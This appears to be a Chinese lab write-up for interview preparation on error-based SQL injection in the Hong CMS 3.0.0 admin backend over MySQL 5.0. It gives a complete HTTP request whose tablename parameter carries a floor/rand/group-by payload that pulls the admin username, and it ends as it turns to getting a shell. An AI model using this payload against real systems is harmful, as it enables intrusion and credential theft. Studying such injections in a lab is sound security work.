# 0x00 前言
360的笔试和前两天的面试都问道这个问题了，只不过360是sql server，然后后来的面试问的是MySQL，以前感觉自己好像都会了，但是当真正遇到问题才发现不是想想中的样子。。

# 0x01 先来MySQL（这个环境好搭建一点）
环境
- Windows server2008
- IIS7+php5+mysql5.0.22
- Hong cms 3.0.0后台报错注入

# 0x02 注入payload

实际遇到可能要先爆破管理员密码。。。。
参考[Hongcms 3.0.0后台SQL注入漏洞分析](https://www.freebuf.com/vuls/178316.html)和[十种MySQL报错注入](https://blog.csdn.net/whatday/article/details/63683187)  
采用报错注入，因为mysql5.0没有updatexml函数，所以使用floor、group by和count函数的冲突进行报错注入。
```
GET /admin/index.php/database/operate?dbaction=emptytable&tablename=hong_vvc%60where%20vvcid=1%20or%20(select%201%20from%20(select%20count(*),concat((select%20ascii(substring(username,1,1))%20from%20hong_admin),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20or%20%60 HTTP/1.1
Host: 192.168.72.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.72.131/admin/index.php/database
Connection: keep-alive
Cookie: O0oqZrypyswqadmin=104918af865ae8146284b36ed2c5c907
Upgrade-Insecure-Requests: 1
```
可以写个脚本用bs4加requests、urllib包写一个注入脚本
[python3爬虫获取html内容及各属性值](https://blog.csdn.net/lzq520210/article/details/76855606)

但是本次以注入拿shell为主就不写了。

那么怎么拿shell呢


